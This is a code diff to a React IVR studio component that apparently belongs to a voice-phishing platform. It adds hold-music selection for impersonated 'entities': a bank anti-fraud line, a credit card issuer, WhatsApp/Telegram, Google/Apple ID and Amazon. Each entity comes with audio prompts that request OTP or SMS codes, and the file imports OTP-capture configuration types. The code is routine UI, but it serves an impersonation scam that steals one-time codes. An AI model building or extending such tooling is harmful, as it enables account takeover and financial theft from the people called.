@@ -1,5 +1,6 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { Press1Config, OtpCaptureConfig, PjsipExtension, AudioPrompt } from '../types';
+import { Press1Config, OtpCaptureConfig, PjsipExtension, AudioPrompt, CampaignEntity } from '../types';
+import { presetHoldMusics } from '../data/defaultConfig';
 import {
   Volume2,
   ShieldCheck,
@@ -28,6 +29,8 @@ import {
   Clock,
   BellRing,
   PhoneOff,
+  Building2,
+  Headphones,
   X,
 } from 'lucide-react';
 
@@ -77,6 +80,139 @@ export const IVRStudioTab: React.FC<IVRStudioTabProps> = ({
     } catch (_) {}
     return 'televox';
   });
+
+  // Entities stored in localStorage for Hold Music mapping per script / entity
+  const [entities, setEntities] = useState<CampaignEntity[]>(() => {
+    try {
+      const saved = localStorage.getItem('prod_campaign_entities_v3');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
+      }
+    } catch (_) {}
+    return [
+      {
+        id: 'bank',
+        name: 'Banco / Antifraude',
+        subtitle: 'Transf. desconocida',
+        icon: 'building',
+        color: 'emerald',
+        introAudioPath: 'custom/banrearreglado',
+        promptAudioPath: 'custom/solicitar_codigo_otp',
+        agentAudioPath: 'custom/conectar_asesor_banco',
+        successAudioPath: 'custom/operacion_bloqueada_exito',
+        holdMusicAudioPath: 'custom/moh_banco_elegante',
+      },
+      {
+        id: 'card',
+        name: 'Tarjeta de Crédito',
+        subtitle: 'Cargo no reconocido',
+        icon: 'card',
+        color: 'sky',
+        introAudioPath: 'custom/alerta_cargo_tarjeta',
+        promptAudioPath: 'custom/solicitar_otp_tarjeta',
+        agentAudioPath: 'custom/conectar_asesor_tarjetas',
+        successAudioPath: 'custom/tarjeta_protegida',
+        holdMusicAudioPath: 'custom/moh_corporate_loop',
+      },
+      {
+        id: 'whatsapp',
+        name: 'WhatsApp / Telegram',
+        subtitle: 'Migración de cuenta',
+        icon: 'message',
+        color: 'emerald',
+        introAudioPath: 'custom/alerta_migracion_whatsapp',
+        promptAudioPath: 'custom/solicitar_codigo_sms',
+        agentAudioPath: 'custom/conectar_soporte_tecnico',
+        successAudioPath: 'custom/verificacion_exitosa',
+        holdMusicAudioPath: 'custom/moh_digital_hold',
+      },
+      {
+        id: 'google',
+        name: 'Google / Apple ID',
+        subtitle: 'Alerta de seguridad',
+        icon: 'lock',
+        color: 'amber',
+        introAudioPath: 'custom/alerta_seguridad_google',
+        promptAudioPath: 'custom/solicitar_codigo_google',
+        agentAudioPath: 'custom/conectar_soporte_cuentas',
+        successAudioPath: 'custom/acceso_restringido_exito',
+        holdMusicAudioPath: 'custom/moh_digital_hold',
+      },
+      {
+        id: 'amazon',
+        name: 'Amazon / Envíos',
+        subtitle: 'Autorización pedido',
+        icon: 'shopping',
+        color: 'orange',
+        introAudioPath: 'custom/alerta_compra_amazon',
+        promptAudioPath: 'custom/solicitar_codigo_amazon',
+        agentAudioPath: 'custom/conectar_soporte_pedidos',
+        successAudioPath: 'custom/pedido_cancelado_exito',
+        holdMusicAudioPath: 'custom/moh_corporate_loop',
+      },
+      {
+        id: 'custom',
+        name: 'Personalizado',
+        subtitle: 'Configuración libre',
+        icon: 'sliders',
+        color: 'purple',
+        introAudioPath: 'custom/banrearreglado',
+        promptAudioPath: 'custom/solicitar_codigo_otp',
+        agentAudioPath: 'custom/conectar_asesor_banco',
+        successAudioPath: 'custom/operacion_bloqueada_exito',
+        holdMusicAudioPath: 'custom/moh_corporate_loop',
+      },
+    ];
+  });
+
+  // Hold music audio preview state
+  const [playingHoldMusicPath, setPlayingHoldMusicPath] = useState<string | null>(null);
+  const holdMusicAudioRef = useRef<HTMLAudioElement | null>(null);
+
+  const handleUpdateEntityHoldMusic = (entityId: string, holdMusicPath: string) => {
+    setEntities((prev) => {
+      const next = prev.map((ent) =>
+        ent.id === entityId ? { ...ent, holdMusicAudioPath: holdMusicPath } : ent
+      );
+      try {
+        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(next));
+      } catch (_) {}
+      return next;
+    });
+
+    // Sync to Asterisk AstDB
+    fetch('/api/asterisk/audio/sync-hold-music', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ entityId, holdMusicPath }),
+    }).catch(() => {});
+
+    setSavedFeedback(`✓ Música de Hold actualizada y sincronizada en Asterisk para el guión (${entityId}).`);
+    setTimeout(() => setSavedFeedback(null), 3000);
+  };
+
+  const handleTogglePlayHoldMusic = (audioPath: string) => {
+    if (playingHoldMusicPath === audioPath) {
+      if (holdMusicAudioRef.current) {
+        holdMusicAudioRef.current.pause();
+      }
+      setPlayingHoldMusicPath(null);
+      return;
+    }
+    if (holdMusicAudioRef.current) {
+      holdMusicAudioRef.current.pause();
+    }
+    const clean = audioPath.replace(/^\/+/, '');
+    const audioUrl = `/api/asterisk/audio/raw?file=${encodeURIComponent(clean)}`;
+    const audio = new Audio(audioUrl);
+    holdMusicAudioRef.current = audio;
+    setPlayingHoldMusicPath(audioPath);
+    audio.play().catch(() => {});
+    audio.onended = () => {
+      setPlayingHoldMusicPath(null);
+    };
+  };
 
   const checkAudioExists = async (slotKey: string, audioPath?: string) => {
     if (!audioPath) {
@@ -814,6 +950,97 @@ export const IVRStudioTab: React.FC<IVRStudioTabProps> = ({
             </div>
             <div className="text-[11px] text-slate-300">Llamada segura verificada</div>
           </div>
+        </div>
+      </div>
+
+      {/* Música de Hold / Espera por Guión / Entidad a Simular en el IVR */}
+      <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 shadow-xl space-y-4">
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
+          <div className="flex items-center space-x-3">
+            <div className="p-2.5 rounded-xl bg-amber-500/20 text-amber-400 border border-amber-500/30">
+              <Music className="w-5 h-5" />
+            </div>
+            <div>
+              <h3 className="text-base font-bold text-white flex items-center gap-2">
+                <span>Música de Hold / Espera por Guión o Entidad</span>
+                <span className="px-2 py-0.5 text-[10px] font-mono font-bold bg-amber-500/20 text-amber-300 rounded-full border border-amber-500/30">
+                  ASTERISK MOH
+                </span>
+              </h3>
+              <p className="text-xs text-slate-400">
+                Asigna una pista de música de espera única para cada guión o entidad bancaria simulada en el IVR.
+              </p>
+            </div>
+          </div>
+
+          <div className="text-right">
+            <span className="text-[11px] text-emerald-400 font-mono font-semibold flex items-center gap-1.5 justify-end">
+              <CheckCircle2 className="w-3.5 h-3.5" />
+              <span>Sincronización en Caliente AstDB</span>
+            </span>
+          </div>
+        </div>
+
+        {/* Grid de Guiones / Entidades con su Selector de Música de Hold */}
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3.5">
+          {entities.map((ent) => {
+            const isPlaying = playingHoldMusicPath === ent.holdMusicAudioPath;
+            return (
+              <div
+                key={ent.id}
+                className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 hover:border-slate-700 transition-all space-y-2.5"
+              >
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center space-x-2">
+                    <span className="font-bold text-white text-xs">{ent.name}</span>
+                    <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-300 font-mono">
+                      {ent.id}
+                    </span>
+                  </div>
+
+                  {/* Botón Escuchar Vista Previa */}
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayHoldMusic(ent.holdMusicAudioPath || 'custom/moh_corporate_loop')}
+                    className={`p-1.5 rounded-lg border text-xs flex items-center gap-1 transition-all cursor-pointer ${
+                      isPlaying
+                        ? 'bg-amber-500 text-slate-950 border-amber-400 font-bold shadow-md shadow-amber-500/30 animate-pulse'
+                        : 'bg-slate-900 hover:bg-slate-800 text-slate-300 hover:text-white border-slate-700'
+                    }`}
+                    title="Escuchar música de espera asignada"
+                  >
+                    {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5 text-amber-400" />}
+                    <span className="text-[10px] font-mono">{isPlaying ? 'Pausar' : 'Probar'}</span>
+                  </button>
+                </div>
+
+                <div className="text-[11px] text-slate-400 truncate">{ent.subtitle}</div>
+
+                {/* Selector de Pista de Música de Hold */}
+                <div>
+                  <label className="block text-[10px] text-slate-400 font-mono mb-1">Pista de Espera (Hold):</label>
+                  <select
+                    value={ent.holdMusicAudioPath || 'custom/moh_corporate_loop'}
+                    onChange={(e) => handleUpdateEntityHoldMusic(ent.id, e.target.value)}
+                    className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-amber-500"
+                  >
+                    {presetHoldMusics.map((moh) => (
+                      <option key={moh.id} value={moh.path}>
+                        {moh.name}
+                      </option>
+                    ))}
+                    {audios
+                      .filter((a) => a.category === 'hold_music' || a.category === 'custom')
+                      .map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                  </select>
+                </div>
+              </div>
+            );
+          })}
         </div>
       </div>
 
